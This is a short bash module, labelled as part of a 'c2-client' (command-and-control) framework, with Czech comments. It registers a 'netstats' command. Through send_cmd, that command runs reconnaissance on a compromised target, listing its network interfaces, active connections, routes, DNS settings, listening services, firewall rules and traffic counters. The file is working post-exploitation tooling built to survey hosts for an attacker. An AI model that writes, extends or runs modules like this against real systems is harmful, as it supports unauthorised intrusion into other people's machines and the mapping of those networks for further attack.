#!/usr/bin/env bash
#c2-client module
#SDirSxobYJ
#network

source funcmgr.sh
SDirSxobYJ_init() {
  register_function "netstats" "network_stats" 0 "Target network basic info"
}

SDirSxobYJ_main() {
  :
}

SDirSxobYJ_description() {
  echo -e "Network tools module"
}

SDirSxobYJ_help() {
  echo -e "${BLUE}netstats${NC} show basic network statistics"
}

network_stats() {
  echo -e "${GREEN}[*]${YELLOW} Network Statistics and Connections:${NC}"
  echo -e "${BLUE}════════════════════════════════════════════${NC}"

  # Rozhraní a IP adresy
  echo -e "${GREEN}[+]${YELLOW} Network Interfaces:${NC}"
  send_cmd "ip addr show 2>/dev/null || ifconfig 2>/dev/null || echo 'No network tools available'"
  echo

  # Aktivní spojení
  echo -e "${GREEN}[+]${YELLOW} Active Connections:${NC}"
  send_cmd "netstat -tunap 2>/dev/null || ss -tunap 2>/dev/null || lsof -i 2>/dev/null | head -20"
  echo

  # Routing table
  echo -e "${GREEN}[+]${YELLOW} Routing Table:${NC}"
  send_cmd "ip route show 2>/dev/null || route -n 2>/dev/null || echo 'No routing tools available'"
  echo

  # DNS konfigurace
  echo -e "${GREEN}[+]${YELLOW} DNS Configuration:${NC}"
  send_cmd "cat /etc/resolv.conf 2>/dev/null | grep -v '^#' | grep -v '^$' || echo 'No DNS config found'"
  echo

  # Síťové služby
  echo -e "${GREEN}[+]${YELLOW} Listening Services:${NC}"
  send_cmd "netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null || lsof -i -sTCP:LISTEN 2>/dev/null | head -15"
  echo

  # Firewall status
  echo -e "${GREEN}[+]${YELLOW} Firewall Status:${NC}"
  send_cmd "iptables -L -n 2>/dev/null || ufw status 2>/dev/null || firewall-cmd --state 2>/dev/null || echo 'No firewall detected'"
  echo

  # Síťová throughput statistika
  echo -e "${GREEN}[+]${YELLOW} Network Throughput:${NC}"
  send_cmd "cat /proc/net/dev 2>/dev/null | head -5 | tail -2"
  echo
}
